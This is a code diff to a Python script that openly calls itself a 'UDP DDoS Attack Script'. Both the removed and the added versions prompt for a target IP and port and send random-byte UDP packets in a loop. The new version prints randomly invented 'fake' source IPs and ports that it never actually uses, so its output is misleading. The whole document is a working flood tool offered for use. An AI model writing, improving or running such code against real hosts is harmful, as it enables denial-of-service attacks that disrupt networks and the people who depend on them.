@@ -1,47 +1,42 @@
-import sys
-import os
-import time
 import socket
 import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+import time
 
-##############
+print("UDP DDoS Attack Script\n")
+
+target_ip = input("Enter the target IP address: ")
+target_port = int(input("Enter the target port number: "))
+
+duration = int(input("Enter duration of attack in seconds: "))
+
+# Create a UDP socket object
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print()
-print("Author   : M1noa")
-print()
-ip = input("IP Target : ")
-port = int(input("Port       : "))
+# Generate random data to send in packets
+data = random._urandom(10240)
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print("[                    ] 0% ")
-time.sleep(5)
-print("[=====               ] 25%")
-time.sleep(5)
-print("[==========          ] 50%")
-time.sleep(5)
-print("[===============     ] 75%")
-time.sleep(5)
-print("[====================] 100%")
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
-     if port == 65534:
-       port = 1
+print("\nStarting UDP Mix attack on %s:%s for %s seconds..." % (target_ip, target_port, duration))
+
+# Keep track of the number of packets sent
+packet_count = 0
+
+# Keep track of the start time
+start_time = time.time()
+
+while (time.time() - start_time) < duration:
+    # Send a UDP packet with fake source IP and port
+    fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+    fake_port = random.randint(1, 65535)
+
+    # Create the UDP packet
+    packet = data + str(packet_count).encode('utf-8')
+
+    # Send the packet to the target
+    sock.sendto(packet, (target_ip, target_port))
+
+    # Print packet details
+    print("Packet sent to %s:%s from %s:%s (%s bytes)" % (target_ip, target_port, fake_ip, fake_port, len(packet)))
+
+    packet_count += 1
+
+print("\nAttack finished.")
